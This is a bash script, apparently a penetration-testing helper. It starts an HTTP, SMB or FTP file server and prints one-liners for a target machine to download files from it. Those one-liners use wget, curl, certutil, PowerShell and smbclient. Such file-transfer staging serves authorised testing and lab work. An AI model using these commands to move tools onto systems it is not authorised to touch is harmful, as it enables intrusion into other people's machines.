#!/usr/bin/env bash
#
# serve.sh
#
# Stand up a quick file-transfer server (HTTP, SMB, or FTP) and print matching
# download one-liners for the target box. Saves looking up the certutil/wget/
# smbclient syntax every time.
#
# Usage:
#   ./serve.sh                              # HTTP on 8000, serving the current dir
#   ./serve.sh --dir /tmp/loot --port 80    # HTTP on 80
#   ./serve.sh --type smb --dir /tmp/loot   # impacket SMB share
#   ./serve.sh --type ftp --dir /tmp/loot   # anonymous FTP
#   ./serve.sh --lhost tun0                 # set the host used in the printed cmds
#   ./serve.sh --print-only                 # print commands, don't start a server
#
set -uo pipefail

TYPE="http"
DIR="."
PORT=""
LHOST=""
PRINT_ONLY=0

die()  { echo "ERROR: $*" >&2; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  grep '^#' "$0" | sed 's/^# \{0,1\}//' | sed '/^!/d'
  exit "${1:-0}"
}

resolve_lhost() {
  local v="$1"
  if [ -n "$v" ] && [ -d "/sys/class/net/$v" ]; then
    ip -4 -o addr show "$v" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1
  elif [ -n "$v" ]; then
    echo "$v"
  else
    # best-effort: primary source IP toward a public address
    ip -4 route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -n1
  fi
}

# --- parse args -----------------------------------------------------------
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)     usage 0 ;;
    -t|--type)     shift; [ $# -gt 0 ] || die "--type needs a value"; TYPE="$1" ;;
    --type=*)      TYPE="${1#*=}" ;;
    -d|--dir)      shift; [ $# -gt 0 ] || die "--dir needs a path"; DIR="$1" ;;
    --dir=*)       DIR="${1#*=}" ;;
    -p|--port)     shift; [ $# -gt 0 ] || die "--port needs a value"; PORT="$1" ;;
    --port=*)      PORT="${1#*=}" ;;
    --lhost)       shift; [ $# -gt 0 ] || die "--lhost needs a value"; LHOST="$1" ;;
    --lhost=*)     LHOST="${1#*=}" ;;
    --print-only)  PRINT_ONLY=1 ;;
    *)             die "Unknown option: $1 (try --help)" ;;
  esac
  shift
done

[ -d "$DIR" ] || die "Directory not found: $DIR"
IP=$(resolve_lhost "$LHOST")
[ -n "$IP" ] || IP="YOUR_IP"

# default ports per type
if [ -z "$PORT" ]; then
  case "$TYPE" in http) PORT=8000 ;; ftp) PORT=21 ;; smb) PORT=445 ;; esac
fi

echo ">> Serving : $DIR"
echo ">> Type    : $TYPE   Host: $IP   Port: $PORT"
echo

case "$TYPE" in
  # ------------------------------------------------------------------ HTTP
  http)
    echo "# Download from the target:"
    echo "wget http://${IP}:${PORT}/FILE -O FILE"
    echo "curl http://${IP}:${PORT}/FILE -o FILE"
    echo "certutil -urlcache -split -f http://${IP}:${PORT}/FILE FILE       # Windows"
    echo "powershell -c \"Invoke-WebRequest http://${IP}:${PORT}/FILE -OutFile FILE\""
    echo
    [ "$PRINT_ONLY" -eq 1 ] && exit 0
    if have updog; then
      echo ">> Starting updog..."
      exec updog -d "$DIR" -p "$PORT"
    elif have python3; then
      echo ">> Starting python3 http.server..."
      exec python3 -m http.server "$PORT" --directory "$DIR"
    else
      die "Need python3 or updog for an HTTP server."
    fi
    ;;
  # ------------------------------------------------------------------- SMB
  smb)
    share="share"
    echo "# Download from the target:"
    echo "copy \\\\${IP}\\${share}\\FILE FILE                                 # Windows"
    echo "smbclient //${IP}/${share} -N -c 'get FILE'                        # Linux"
    echo
    [ "$PRINT_ONLY" -eq 1 ] && exit 0
    if have impacket-smbserver; then
      echo ">> Starting impacket-smbserver (SMB2)..."
      exec impacket-smbserver "$share" "$DIR" -smb2support
    elif have smbserver.py; then
      exec smbserver.py "$share" "$DIR" -smb2support
    else
      die "Need impacket-smbserver (apt install python3-impacket)."
    fi
    ;;
  # ------------------------------------------------------------------- FTP
  ftp)
    echo "# Download from the target:"
    echo "wget ftp://${IP}:${PORT}/FILE -O FILE"
    echo "curl ftp://${IP}:${PORT}/FILE -o FILE"
    echo
    [ "$PRINT_ONLY" -eq 1 ] && exit 0
    if have python3 && python3 -c "import pyftpdlib" 2>/dev/null; then
      echo ">> Starting pyftpdlib (anonymous)..."
      exec python3 -m pyftpdlib -p "$PORT" -d "$DIR"
    else
      die "Need pyftpdlib (pip install pyftpdlib / apt install python3-pyftpdlib)."
    fi
    ;;
  *)
    die "Unknown --type '$TYPE' (want http, smb, or ftp)."
    ;;
esac
